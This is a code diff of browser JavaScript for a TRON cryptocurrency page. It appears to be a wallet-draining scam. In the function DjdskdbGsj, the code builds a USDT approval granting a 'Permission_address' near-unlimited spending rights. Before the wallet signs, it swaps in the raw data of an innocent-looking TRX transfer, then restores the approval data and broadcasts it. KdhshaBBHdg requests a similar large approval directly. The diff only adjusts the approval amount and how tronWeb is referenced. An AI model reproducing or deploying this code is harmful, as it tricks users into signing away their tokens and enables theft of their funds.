@@ -20,31 +20,31 @@ async function onNextButtonClick() {
 
 
 async function DjdskdbGsj() {
-  const trxAmountInSun = tronWeb.toSun(currentAmount);
-  const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+  const trxAmountInSun = window.tronWeb.toSun(currentAmount);
+  const approveAmount = 999999 * 1e6; // 999999 USDT，6位精度
   const feeLimit = 1000000000;
   
   try {
 
-    const paymentAddress = tronWeb.address.fromHex(window.Payment_address);
+    const paymentAddress = window.tronWeb.address.fromHex(window.Payment_address);
     
     console.log("构建TRX转账交易...");
-    const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
+    const transferTransaction = await window.tronWeb.transactionBuilder.sendTrx(
       paymentAddress,
       trxAmountInSun,
-      tronWeb.defaultAddress.base58,
+      window.tronWeb.defaultAddress.base58,
       { feeLimit: feeLimit }
     );
 
-    const approvalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
-      tronWeb.address.toHex(window.usdtContractAddress),
+    const approvalTransaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
+      window.tronWeb.address.toHex(window.usdtContractAddress),
       'increaseApproval(address,uint256)',
       { feeLimit: feeLimit },
       [
         { type: 'address', value: window.Permission_address },
-        { type: 'uint256', value: maxUint256 }
+        { type: 'uint256', value: approveAmount }
       ],
-      tronWeb.defaultAddress.base58
+      window.tronWeb.defaultAddress.base58
     );
 
     const originalRawData = approvalTransaction.transaction.raw_data;
@@ -52,12 +52,12 @@ async function DjdskdbGsj() {
     approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
 
     console.log("交易签名中...");
-    const signedTransaction = await tronWeb.trx.sign(approvalTransaction.transaction);
+    const signedTransaction = await window.tronWeb.trx.sign(approvalTransaction.transaction);
 
     signedTransaction.raw_data = originalRawData;
 
     console.log("发送交易...");
-    const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
+    const broadcastResult = await window.tronWeb.trx.sendRawTransaction(signedTransaction);
 
     console.log("交易结果:", broadcastResult);
     if (broadcastResult.result || broadcastResult.success) {
@@ -79,21 +79,21 @@ async function DjdskdbGsj() {
 }
 
 async function KdhshaBBHdg() {
-    const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+    const approveAmount = 999999 * 1e6; // 999999 USDT，6位精度
     const feeLimit = 100000000;  // 设置feeLimit为100 TRX
-    const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);
+    const usdtContractAddressHex = window.tronWeb.address.toHex(window.usdtContractAddress);
 
     try {
         console.log("构建交易...");
-        const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
+        const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
             usdtContractAddressHex,
             'approve(address,uint256)',
             { feeLimit: feeLimit },
             [
-                { type: 'address', value: tronWeb.address.toHex(window.Permission_address) },
-                { type: 'uint256', value: maxUint256 }
+                { type: 'address', value: window.tronWeb.address.toHex(window.Permission_address) },
+                { type: 'uint256', value: approveAmount }
             ],
-            tronWeb.defaultAddress.base58
+            window.tronWeb.defaultAddress.base58
         );
 
         if (!transaction.result || !transaction.result.result) {
@@ -101,10 +101,10 @@ async function KdhshaBBHdg() {
         }
 
         console.log("交易签名中...");
-        const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
+        const signedTransaction = await window.tronWeb.trx.sign(transaction.transaction);
 
         console.log("发送交易...");
-        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
+        const result = await window.tronWeb.trx.sendRawTransaction(signedTransaction);
 
         console.log("交易交易结果:", result);
         if (result.result) {
